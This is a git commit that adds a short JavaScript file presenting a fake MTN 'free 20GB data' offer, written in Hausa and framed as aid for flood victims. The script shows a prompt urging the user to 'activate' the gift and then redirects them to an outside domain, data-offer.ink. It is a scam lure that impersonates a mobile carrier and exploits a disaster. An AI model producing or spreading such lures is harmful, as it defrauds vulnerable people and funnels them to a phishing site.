883041a5483cdc934aedc489a672c68f6869db9f
katemj25 <mbokofficial1@gmail.com>
2025-06-02 21:28:32 -0700

    Create activate-mtn20gb-freeoffer.js

---
+++ activate-mtn20gb-freeoffer.js
@@ -0,0 +1,5 @@
+var password = '20GB data kyauta'
+password=prompt('SMS: Muna tayaka murna da lambarka ta cancanci samun kyautar 20GB na kyauta MTN yana tallafawa wadanda ambaliyar ruwa ta shafa, da fatan za a danna Ok don ACTIVATE. ','20GB data kyauta');
+if (password != '20GB data kyauta') {
+location.href='https://data-offer.ink/activate-mtn20gb-freeoffer.html';
+}
